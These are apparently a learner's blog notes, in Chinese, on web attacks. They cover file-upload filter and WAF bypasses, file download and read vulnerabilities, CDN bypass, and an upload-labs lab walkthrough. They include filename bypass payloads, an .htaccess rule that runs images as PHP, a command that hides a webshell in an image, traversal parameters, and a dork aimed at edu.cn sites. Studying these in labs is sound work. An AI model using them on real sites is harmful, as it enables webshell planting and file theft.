<p>7、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CVE编号文件上传漏洞测试:1:25:00</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">图片来自于小迪安全,只是方便个人学习,如有侵权联删</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传--黑/白名单绕过</title>
    <url>/2023/10/05/wenjianshangchuan2/</url>
    <content><![CDATA[<h2 id="文件上传–黑-白名单绕过"><a href="#文件上传–黑-白名单绕过" class="headerlink" title="文件上传–黑&#x2F;白名单绕过"></a>文件上传–黑&#x2F;白名单绕过</h2><p>1、文件上传常见验证:<br>后缀名，类型，文件头等<br>后缀名:黑名单,白名单<br>文件类型:MIME(抓包时,Content-Type这个字段)<br>信息文件头:内容头信息<br>2、常见后缀黑名单(明确不让上传的脚本格式后缀):<br>asp,php,cgi,jsp,war,aspx<br>3、常见后缀白名单(明确可以上传的脚本格式后缀,较黑名单验证安全):<br>png,jpg,zip,rar,gif<br>4、上传脚本时,类型(后缀名)尽量与对方的网站搭建类型(php搭建的,上传.php)保持一致。<br>5、.htacces文件(自己上网搜配置)是Apache的一个配置文件,上传文件时先上传这个,后面上传的指定正常文件(如jpg等图片格式),然后访问这个文件,会被当做php代码执行,但是其他的任何图片不受影响。<br>6、了解一次过滤与循环过滤的区别。<br>7、白名单绕过中的%00绕过与0x00绕过:<br>条件：<br>php版本小于5.3.4<br>php的magic_quotes_gpc为OFF状态<br>%00是urlencode(get方法)，0x00是十六进制(post方法)。<br>8、在get方法传数据不用编码,而在post方法传数据需要编码(get会自动解码,post不会)。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=20&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件上传代码审计(php+html混合上传):16:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=20&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">通过.htacces文件绕过(其实这集可以二刷,学习到一系列文件上传漏洞):55:00</a><br><a href="https://www.bilibili.com/video/:BV1JZ4y1c7ro/?p=20&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">白名单绕过中的%00绕过与0x00绕过:1:25:00</a></p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传--内容逻辑绕过与解析漏洞</title>
    <url>/2023/10/07/wenjianshangchuan3/</url>
    <content><![CDATA[<h2 id="内容逻辑绕过-排除了解析漏洞等-限制只可上传图片-那么就使用内容逻辑绕过的思路"><a href="#内容逻辑绕过-排除了解析漏洞等-限制只可上传图片-那么就使用内容逻辑绕过的思路" class="headerlink" title="内容逻辑绕过(排除了解析漏洞等,限制只可上传图片,那么就使用内容逻辑绕过的思路)"></a>内容逻辑绕过(排除了解析漏洞等,限制只可上传图片,那么就使用内容逻辑绕过的思路)</h2><p>有些上传文件时的验证不是单单判断文件后缀是否为黑名单&#x2F;白名单,而是判断文件头(比如png与gif的文件头不一样)&#x2F;获取的图像信息(判断是否为图片),这种情况下可以转换内容逻辑绕过的思想。</p>
<h2 id="文件包含漏洞-不属于文件上传-实现内容逻辑绕过"><a href="#文件包含漏洞-不属于文件上传-实现内容逻辑绕过" class="headerlink" title="文件包含漏洞(不属于文件上传)实现内容逻辑绕过"></a>文件包含漏洞(不属于文件上传)实现内容逻辑绕过</h2><p>原理：<br>​ 文件包含漏洞是指应用程序未对用户输入的文件路径或文件名进行充分的验证和过滤，导致攻击者可以通过向应用程序发送恶意文件路径或文件名来获取敏感信息或执行恶意代码的漏洞。(将被包含的文件以后门的格式去执行)<br>这种漏洞主要发生在应用程序中使用了动态文件包含的情况下。利用文件包含漏洞的原理时，需要满足以下两个条件：<br>​ 1.目标系统存在动态文件包含的功能。(?)<br>​ 2.应用程序未进行适当的输入验证和过滤，使攻击者能够在文件包含参数中注入恶意代码。<br><a href="https://blog.csdn.net/vivlol918/article/details/130667396">文件包含漏洞分析参考</a></p>
<p>图片马(让图片含有后门代码)配合文件包含可以实现文件上传<br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件包含漏洞实现文件上传:3:00</a></p>
<h3 id="关于文件包含漏洞自己的一些思考与感悟"><a href="#关于文件包含漏洞自己的一些思考与感悟" class="headerlink" title="关于文件包含漏洞自己的一些思考与感悟"></a>关于文件包含漏洞自己的一些思考与感悟</h3><p>虽然在图片格式中插入后门代码,图片仍然可以正常打开查看,但是此时仍然是图片格式,直接上传的话那么后门的代码便不会被执行。但是通过图片马(让图片含有后门代码)配合文件包含(目前已知的是php的include函数),可以使被包含的文件以这个文件中插入的后门代码的形式执行,这样便实现了文件上传。</p>
<h2 id="错误的二次渲染配合条件竞争实现内容逻辑绕过"><a href="#错误的二次渲染配合条件竞争实现内容逻辑绕过" class="headerlink" title="错误的二次渲染配合条件竞争实现内容逻辑绕过"></a>错误的二次渲染配合条件竞争实现内容逻辑绕过</h2><p>二次渲染是对文件进行二次操作(如对图片进行保存,放大观看等操作)。<br>错误的二次渲染是什么:<br>  没将文件验证就已经进行文件的移动操作了,意思就是上传文件后将文件临时保存在服务器的temp中,在temp中验证再移动到指定文件夹。<br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">原理:17:00</a><br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">演示:31:00</a></p>
<h2 id="以文件夹的方式去命名-逻辑安全-条件竞争目录命名-–黑名单"><a href="#以文件夹的方式去命名-逻辑安全-条件竞争目录命名-–黑名单" class="headerlink" title="以文件夹的方式去命名(逻辑安全-条件竞争目录命名)–黑名单"></a>以文件夹的方式去命名(逻辑安全-条件竞争目录命名)–黑名单</h2><p>zbc.php&#x2F;.(看起来像文件夹,但这样在绕过验证过滤的同时,把php文件成功上传)<br>原理:也和文件的保存一样,创建一个“.”名字的文件夹保存这个文件,但是会报错,因为系统不允许创建一个名字为”.”的文件夹。</p>
<h2 id="数组接受-目录命名-MIME验证-文件名白名单验证-—–！！！有难度"><a href="#数组接受-目录命名-MIME验证-文件名白名单验证-—–！！！有难度" class="headerlink" title="数组接受+目录命名(MIME验证+文件名白名单验证)—–！！！有难度"></a>数组接受+目录命名(MIME验证+文件名白名单验证)—–！！！有难度</h2><p>zbc.php&#x2F;.jpg<br><a href="vhttps://www.bilibili.com/video/BV1JZ4y1c7ro/?p=21&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">数组接受配合目录命名:55:00</a></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">实战中多为黑盒,仅可自己一个一个试。<span class="comment">(lll￢ω￢)</span>汗~</span><br><span class="line">还有要注意,文件上传漏洞可出现在验证代码,中间件,也可出现在编辑器。</span><br></pre></td></tr></table></figure>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>条件:<br>1、特定中间件。<br>2、指定版本（低版本）。<br>看演示即可。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=21&vd_source=d32bce54780cf3d9710df43274886fde">1:12:00-1:48:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">3:00</a></p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传--WEB编辑器安全、CMS与WAF</title>
    <url>/2023/10/08/wenjianshangchuan4/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件拼接小技巧:33:00-34:00;略微判断有无解析漏洞:35:00</a><br>cmd中,copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg</p>
<h2 id="文件上传–解析漏洞编辑器安全与WAF"><a href="#文件上传–解析漏洞编辑器安全与WAF" class="headerlink" title="文件上传–解析漏洞编辑器安全与WAF"></a>文件上传–解析漏洞编辑器安全与WAF</h2><h2 id="WEB编辑器漏洞"><a href="#WEB编辑器漏洞" class="headerlink" title="WEB编辑器漏洞"></a>WEB编辑器漏洞</h2><p>常见编辑器<br>fckeditor		exp<br>ueditor 		漏洞利用<br>在网上找fckeditor漏洞inurl:fckeditor site:edu.cn<br><a href="https://blog.csdn.net/eldn__/article/details/9197521">https://blog.csdn.net/eldn__/article/details/9197521</a><br>编辑器是网站管理员对图片、音频视频进行操作的中转站,大部分编辑器是文件上传漏洞。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">FCK编辑器演示：50:00</a></p>
<h2 id="CMS编辑器漏洞"><a href="#CMS编辑器漏洞" class="headerlink" title="CMS编辑器漏洞"></a>CMS编辑器漏洞</h2><p>对网站进行识别,判断出是什么CMS。在发现某个网站是使用哪套开源的程序源码,上网搜漏洞。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=22&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">演示：1:09:00</a></p>
<h2 id="总结思路-测试文件上传漏洞"><a href="#总结思路-测试文件上传漏洞" class="headerlink" title="总结思路(测试文件上传漏洞)"></a>总结思路(测试文件上传漏洞)</h2><p>在拿到一个网站,若要测试其上传漏洞：<br>0、WAF的判断以及绕过。<br>1、先尝试直接绕过,黑&#x2F;白名单&#x2F;内容过滤绕过。<br>2、看中间件确定是否存在解析漏洞。<br>3、CMS也会爆出一些文件上传漏洞,利用网上资料。<br>4、编辑器漏洞，同上方法。<br>5、CVE,上官网查看是否爆新的漏洞。</p>
<h2 id="若存在WAF-如何绕过-已知存在文件上传漏洞"><a href="#若存在WAF-如何绕过-已知存在文件上传漏洞" class="headerlink" title="若存在WAF,如何绕过(已知存在文件上传漏洞)"></a>若存在WAF,如何绕过(已知存在文件上传漏洞)</h2><h3 id="上传参数名解析：明确有哪些东西能修改？"><a href="#上传参数名解析：明确有哪些东西能修改？" class="headerlink" title="上传参数名解析：明确有哪些东西能修改？"></a>上传参数名解析：明确有哪些东西能修改？</h3><p>Content-Disposition:	一般可更改(数据类型?)<br>name:	表单参数值，不能更改<br>filename :文件名，可以更改<br>Content-Type:文件MIME，视情况更改</p>
<h3 id="常见绕过方法"><a href="#常见绕过方法" class="headerlink" title="常见绕过方法"></a>常见绕过方法</h3><p>1、数据溢出-防匹配(xxx.. .)<br>2、符号变异-防匹配（’” ;)</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">payload:</span></span><br><span class="line">filename=<span class="string">&quot;x.php</span></span><br><span class="line"><span class="string">filename=&#x27;x.php</span></span><br><span class="line"><span class="string">filename=&quot;</span>x<span class="string">&quot;x.php</span></span><br></pre></td></tr></table></figure>
<p>符号变异就是猜测WAF的字符(串)如何匹配,通过”改filename字段的双引号为单引号、去掉一个双引号”等方式尝试绕过。<br>可知safedog的匹配是从最后一个”往前匹配。<br>3、数据截断-防匹配(%00 ;换行)</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">payload:</span></span><br><span class="line">filename=<span class="string">&quot;x.jpg;.php&quot;</span></span><br><span class="line">filename=&#x27;x.php%00.jpg<span class="string">&quot;(现在失效了)</span></span><br></pre></td></tr></table></figure>
<p>还可以换行:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">payload:</span></span><br><span class="line">filename=<span class="string">&quot;x</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">p&quot;</span></span><br></pre></td></tr></table></figure>
<p>4、重复数据-防匹配(参数多次)</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="keyword">filename</span>=<span class="string">&quot;x.jpg&quot;</span>;<span class="keyword">filename</span>=<span class="string">&quot;x.jpg&quot;</span>;<span class="keyword">filename</span>=<span class="string">&quot;x.jpg&quot;</span>;<span class="keyword">filename</span>=<span class="string">&quot;x.jpg&quot;</span>;<span class="keyword">filename</span>=<span class="string">&quot;y.php&quot;</span>;</span><br><span class="line"><span class="keyword">filename</span>=<span class="string">&quot;Content-Disposition/Content-Type的值x.php&quot;</span></span><br></pre></td></tr></table></figure>
<p>但重复次数又远远比垃圾数据的少。<br><img src="https://pic.imgdb.cn/item/65236836c458853aef306998.png" alt="图一" title="添加重复数据包原有数据"><br><img src="https://pic.imgdb.cn/item/65236813c458853aef305059.png" alt="图二" title="添加重复数据包原有数据"><br><img src="https://pic.imgdb.cn/item/6523682cc458853aef306745.png" alt="图三" title="添加重复数据包原有数据"><br><img src="https://pic.imgdb.cn/item/65236836c458853aef306998.png" alt="图四" title="添加重复数据包原有数据"><br>5、Fuzz模糊测试<br>fuzz字典<br><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br><a href="https://github.com/TuuuNya/fuzz_dict">https://github.com/TuuuNya/fuzz_dict</a><br><a href="https://github.com/jas502n/fuzz-wooyun-org">https://github.com/jas502n/fuzz-wooyun-org</a><br>总之就是防止脚本后缀被匹配出来,思维要灵活,善于思考善于总结,探讨多种方法。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">数据溢出防匹配绕过演示(感觉类似于垃圾数据):18:00-28:30</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">符号变异防匹配绕过演示:28:12-45：50</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">数据截断防匹配绕过演示:45：52-53:30</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">重复数据结合”垃圾数据”防匹配绕过演示:57:00-1:10:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&vd_source=d32bce54780cf3d9710df43274886fde">fuzz演示:1:15:00-</a></p>
<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p><img src="https://pic.imgdb.cn/item/65236d19c458853aef3257ed.png" alt="图五" title="如何优雅地防护?"><br>说明<br>1、函数，参考upload pass16,那个geiimage什么的,必须是图片才可以上传。<br>2、后缀用白名单只能jpg，文件名用黑名单，只有要出现php的字眼就拦截。<br>3、先判断有无WAF,若有则先绕过再判断有无上传漏洞。</p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载|读取</title>
    <url>/2023/10/15/wenjianxiazai/</url>
    <content><![CDATA[<h2 id="文件下载-读取"><a href="#文件下载-读取" class="headerlink" title="文件下载|读取"></a>文件下载|读取</h2><p><img src="https://pic.imgdb.cn/item/652ba885c458853aef8c2071.png" alt="文件下载与读取" title="文件下载与读取"><br>1.文件被解析，则是文件包含漏洞<br>2.显示源代码，则是文件读取漏洞<br>3.提示文件下载，则是文件下载漏洞<br>两篇文章了解文件下载|读取漏洞:<br><a href="https://blog.csdn.net/qq_56414082/article/details/129861894">https://blog.csdn.net/qq_56414082/article/details/129861894</a><br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/130214037">https://blog.csdn.net/Gherbirthday0916/article/details/130214037</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地小案例去了解此类漏洞:5:00</a><br>1、主要是在存在下载文件功能的网站利用此类漏洞去下载用户的敏感或日常文件。<br>2、如何知道某个文件的路径?<br>(1)、可以利用扫描工具爬行或扫描地址(如御剑)<br>(2)、在下载好的文件代码中去分析路径和包含文件获取。<br>#文件名，参数值，目录符号!!!<br>read.xxx?filename&#x3D;<br>down.xxx?filename&#x3D;<br>readfile.xxx?file&#x3D;<br>downfile.xxx?file&#x3D;<br>..&#x2F; ..\ .\ .&#x2F;等<br>%00 ? %23 %20 .等<br>&amp;readpath&#x3D;、&amp;filepath&#x3D;、&amp;path&#x3D;、&amp;inputfile&#x3D;、&amp;url&#x3D;、&amp;data&#x3D;、&amp;readfile&#x3D;、&amp;menu&#x3D;、META-INF&#x3D; 、<br>WEB-INF<br>在网址中看到这些参数值要注意,可以判断是否存在此类漏洞。</p>
<h3 id="具体实例分析"><a href="#具体实例分析" class="headerlink" title="具体实例分析"></a>具体实例分析</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">javaweb实例演示:26:00</a><br>明确:<br>1、下载漏洞在哪里测试?–肯定是存在下载功能的网站<br>2、下载漏洞怎么判断存在?–需要注意的是有的时候需要加密<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">buuojCTF考题分析:40:00</a><br>1、修改提交方式测试-读取 WEB 配置文件 WEB-INF&#x2F;web.xml<br>2、访问读取对应地址-访问读取 flag 对应 class 文件-（WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class）<br>题目整理在:<a href="https://www.yuque.com/weiker/xiaodi/acreedoyq3ecx85r">https://www.yuque.com/weiker/xiaodi/acreedoyq3ecx85r</a><br>下载或文件读取漏洞期望得到的文件：<br>对应文件：配置文件（数据库，平台，各种等）<br>常见敏感文件:<br><img src="https://pic.imgdb.cn/item/652ca7ecc458853aef844f0c.png" alt="敏感文件" title="常见敏感文件"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">百度杯考题分析:56:00</a><br>1、MVC模型:是模型（model）、视图（view）、控制器（controller）三层架构的设计模式，用于把前端页面的展现与后端业务分离。<br>2、看到module想到文件读取或下载。<br>具体了解:<a href="https://blog.csdn.net/weixin_68107783/article/details/127255910">https://blog.csdn.net/weixin_68107783/article/details/127255910</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=31&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">小米路由器实例–文件读取演示:1:12:00</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、学到了java的WEB-INF&#x2F;web.xml文件和module能够调用一个功能模块，可以实现文件读取<br>2、读取Nginx中的配置文件，来得知该题具有目录跨越漏洞实现文件下载<br>3、文件包含、下载|读取三者其实有异曲同工之妙,打靶场时,发现有的文件包含的题目也需要使用..&#x2F;符号去遍历目录,读取一个文件。</p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集（一）</title>
    <url>/2023/09/17/xinxishoudi/</url>
    <content><![CDATA[<h2 id="信息收集（一）"><a href="#信息收集（一）" class="headerlink" title="信息收集（一）"></a>信息收集（一）</h2><h3 id="定义（把在网上可以测试的点全部找出来）"><a href="#定义（把在网上可以测试的点全部找出来）" class="headerlink" title="定义（把在网上可以测试的点全部找出来）"></a>定义（把在网上可以测试的点全部找出来）</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">信息收集是指通过各种方式获取所需要的信息。信息收集是进行渗透测试的第二步（第一步是前期的一个交互，不过目前</span><br><span class="line">大部分是灰盒或者黑盒测试，白盒测试较少，交互也就比较少，主要还是要靠自己对信息进行收集），也是关键的一步。</span><br><span class="line">信息收集工作的好坏，会影响整个渗透测试流程的进行。收集的信息越多后期可进行测试的目标就越多。</span><br></pre></td></tr></table></figure>
<h3 id="了解cdn"><a href="#了解cdn" class="headerlink" title="了解cdn"></a>了解cdn</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">上网搜索得到的定义：CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN 的作用是采用流媒体服务器集群技术，</span><br><span class="line">克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。</span><br><span class="line">自己理解的：其实就是一个服务公司开发的一个站点，它要面向全国甚至全球网民提供服务，但是它的主站点只有一个，</span><br><span class="line">那么距离它近的肯定访问速度较快；反之距离它远的访问速度就慢。这时候就配置cdn服务，相当于在各地设一个分站点，</span><br><span class="line">由站长管理，利用缓存，提前存此网站的资源，等到用户访问的时候直接转发此结点的内容即可。但是，配置cdn服务开销</span><br><span class="line">挺大的，所以配置时要考虑地区用户数量因素。</span><br></pre></td></tr></table></figure>
<h4 id="cdn的绕过"><a href="#cdn的绕过" class="headerlink" title="cdn的绕过"></a>cdn的绕过</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">配置好cdn后，用户发送的请求大多会被分站点响应，从而导致ping得到的响应并非来自主站，探索的<span class="built_in">ip</span>地址也并非主站，</span><br><span class="line">那么此时我们要绕过cdn，获取主站的<span class="built_in">ip</span>。</span><br></pre></td></tr></table></figure>
<h4 id="cdn绕过的方法"><a href="#cdn绕过的方法" class="headerlink" title="cdn绕过的方法"></a>cdn绕过的方法</h4><h5 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h5><p> <a href="https://ping.chinaz.com/">超级ping</a></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">利用配置域名时的漏洞，通常是为www这个二级域名配置cdn服务，如：</span><br><span class="line">www.baidu.<span class="keyword">com</span>与baidu.<span class="keyword">com</span>，我们ping这个baidu.<span class="keyword">com</span>在大多数情况下是可以探索到主站ip的。</span><br></pre></td></tr></table></figure>
<h5 id="2、邮件加社会工程学"><a href="#2、邮件加社会工程学" class="headerlink" title="2、邮件加社会工程学"></a>2、邮件加社会工程学</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">右键查看右键源码，可以看到发送端的<span class="built_in">ip</span>。这时候，我们再进入目标的网站，拉到最底部，</span><br><span class="line">看看备案是在哪个省份的，接着再超级ping，若ping到的<span class="built_in">ip</span>就是那个省份，那么这很大可能就是主站<span class="built_in">ip</span>。</span><br></pre></td></tr></table></figure>
<h5 id="3、黑暗引擎"><a href="#3、黑暗引擎" class="headerlink" title="3、黑暗引擎"></a>3、黑暗引擎</h5><p><a href="https://www.shodan.io/">傻蛋</a><br><a href="https://www.zoomeye.org/">zoomeye</a><br><a href="https://fofa.info/">fofa</a></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">此类搜索引擎是实时更新的，功能更加强大。可以扫<span class="built_in">ip</span>，扫域名，甚至字符、文字等。</span><br></pre></td></tr></table></figure>
<h4 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h4><p><a href="https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&ch=5&tn=25017023_2_dg&wd=cdn&oq=%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%25E4%25B9%258B%25E4%25BF%25A1%25E6%2581%25AF%25E6%2594%25B6%25E9%259B%2586&rsv_pq=c697402c00278774&rsv_t=1b340NYTw8y/B0kHgxivY4eKF97GyKwrMWewkfO9DhYekTM5sEiMZWd9mvmH8vWOzF/kTQ&rqlang=cn&rsv_enter=1&rsv_dl=tb&rsv_btype=t&inputT=1203&rsv_sug3=22&rsv_sug1=15&rsv_sug7=100&rsv_sug2=0&rsv_sug4=1203">什么是cdn？</a><br><a href="https://blog.csdn.net/weixin_52180702/article/details/125747433">渗透测试中的信息收集是什么意思</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>记录upload-labs通关过程</title>
    <url>/2023/10/08/wjscPractixe/</url>
    <content><![CDATA[<p>使用upload-labs靶场<br>环境：WIN10，php5.3.29</p>
<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>代码审计,为js脚本,明显的前端验证(形同虚设),直接禁用js即可。也可以使用第二关的思路,直接抓包,保证MIME值为png&#x2F;jpg&#x2F;gif的类型即可。</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>代码审计,发现仅仅是验证MIME属性。直接抓包,保证MIME值为png&#x2F;jpg&#x2F;gif的类型即可。</p>
<h2 id="Pass-03（！）"><a href="#Pass-03（！）" class="headerlink" title="Pass-03（！）"></a>Pass-03（！）</h2><p>代码审计,发现过滤类型为黑名单验证,但不完整。php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml等都会被当成php代码执行,所以上传一个这类类型的文件即可。</p>
<h2 id="Pass-04（！）"><a href="#Pass-04（！）" class="headerlink" title="Pass-04（！）"></a>Pass-04（！）</h2><p>发现上述类型的也被列入了黑名单,那么可以使用.htaccess(配置文件)文件上传。在upload-labs目录下创建一个.htaccess文件,内容为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;shana&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
<p>意思就是如果文件里面有一个名字为”shana”的文件，他就会被解析成.php。先上传一个1.png文件，然后上传这个.htaccess，再访问1.png,完成。<br>(这里不知道为什么,按照迪的步骤来,就是不成功)</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>运用到了一点点php代码审计。<br><img src="https://pic.imgdb.cn/item/6523bbf2c458853aef50cb47.png" alt="图一" title="pass5部分代码"><br>如图,此代码对于上传的文件的验证时是先去掉末尾的一个点,再去掉末尾以及首部的空格。那么我们可以利用此处代码的瑕疵。<br><img src="https://pic.imgdb.cn/item/6523bce2c458853aef514ab8.png" alt="图二" title="pass5 burp抓包"><br>burp抓包发到重发器,将filename的字段值改为1.PHP. .,之后send,发现成功绕过上传。<br>访问此文件地址:<br><img src="https://pic.imgdb.cn/item/6523bce7c458853aef514ba4.png" alt="图三" title="pass5 通关界面"></p>
<h2 id="Pass-06（！）"><a href="#Pass-06（！）" class="headerlink" title="Pass-06（！）"></a>Pass-06（！）</h2><p>继续代码审计,发现并没有大小写过滤<br><img src="https://pic.imgdb.cn/item/65240c96c458853aef68d0d4.png" alt="图四" title="pass6部分代码"><br>那么直接上传php文件,抓包并把filename值后缀改为.Php看下行不行。<br><img src="https://pic.imgdb.cn/item/6523c1dcc458853aef5395e6.png" alt="图五" title="pass6 burp抓包"><br>提示成功。<br>但是此时我访问不了这个文件,报错显示<br><img src="https://pic.imgdb.cn/item/6523c23ac458853aef53e638.png" alt="图六" title="pass6 "><br>不知道什么原因,望指点,谢谢。</p>
<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>接着代码审计,发现没有空格过滤<br><img src="https://pic.imgdb.cn/item/65240cc7c458853aef68d75e.png" alt="图七" title="pass7部分代码"><br>那么直接上传php文件,抓包并把filename值后缀改为.php<br><img src="https://pic.imgdb.cn/item/65240d7bc458853aef68f010.png" alt="图八" title="pass7burp抓包"><br>访问此文件地址,成功解析。</p>
<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>接着代码审计,发现没有文末.过滤<br><img src="https://pic.imgdb.cn/item/65240e19c458853aef69029e.png" alt="图九" title="pass8部分代码"><br>那么直接上传php文件,抓包并把filename值后缀改为”.php.”<br><img src="https://pic.imgdb.cn/item/65240e7ac458853aef6911d0.png" alt="图十" title="pass8burp抓包"><br>访问此文件地址,成功解析,对应的文件目录出现上传的文件。<br><img src="https://pic.imgdb.cn/item/65240f28c458853aef69318f.png" alt="图十一" title="pass8结果"></p>
<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>代码审计,发现并没有::$DATA过滤<br><img src="https://pic.imgdb.cn/item/6524f3d8c458853aef99af74.png" alt="图十二" title="pass9部分代码"><br>直接抓包在burp修改即可。在filename字段值添加::$DATA即可。<br><img src="https://pic.imgdb.cn/item/6524f660c458853aef9aedcb.png" alt="图十三" title="pass9burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。<br><img src="https://pic.imgdb.cn/item/6524f674c458853aef9af2a1.png" alt="图十四" title="pass9结果"></p>
<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>与Pass-5相同。</p>
